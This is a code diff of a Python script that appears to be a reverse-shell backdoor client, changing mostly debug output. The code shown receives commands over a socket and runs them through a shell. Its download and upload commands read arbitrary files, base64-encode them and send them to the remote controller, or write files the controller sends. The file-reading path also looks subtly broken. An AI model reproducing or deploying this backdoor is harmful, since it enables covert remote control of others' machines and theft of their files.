@@ -9,13 +9,19 @@ import subprocess
 from time import sleep
 from termcolor import colored
 
+count = 1
 
-def s_send(data):
-    print(2)
-    json_data = json.dumps(data)
-    print(3)
+
+def s_send(encoded_data):
+    json_data = json.dumps(encoded_data)
+    global count
+    print(count)
+    count = count + 1
+    print(type(json_data))
+    print(type(json_data.encode("utf-8")))
     sock.send(json_data.encode("utf-8"))
-    print(4)
+    print(count)
+    count = count + 1
 
 def s_recv():
     data = ""
@@ -29,9 +35,9 @@ def s_recv():
             sys.exit()
 
 def shell():
+    global count
     while True:
         command = s_recv()
-        print(command)
         if command == "q":
             break
         elif command[:2] =="cd" and len(command) > 1:
@@ -40,22 +46,25 @@ def shell():
             except:
                 continue
         elif command[:8] == "download":
-            print(command[:8])
-            print(command[9:])
             try:
                 with open(command[9:], "r") as fout:
-                    print(type(fout.read()))
-                    print(1)
-                    print(fout.read())
-                    s_send(base64.b64encode(fout.read()))
-                    print(5)
+                    data = fout.read()
+                    print(type(data))
+                    print(count)
+                    count = count + 1
+                    encoded_data = base64.b64encode(data)
+                    print(count)
+                    count = count + 1
+                    print(type(encoded_data))
+                    print(count)
+                    count = count + 1
+                    s_send(encoded_data)
             except:
                 print(colored("Download Failed !!!", "red"))
+                print(socket.error)
         elif command[:6] == "upload":
             with open(command[7:], "wb") as fin:
                 file_data = s_recv()
-                print(type(file_data))
-                print(file_data)
                 fin.write(base64.b64decode(file_data))
         else:
             proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
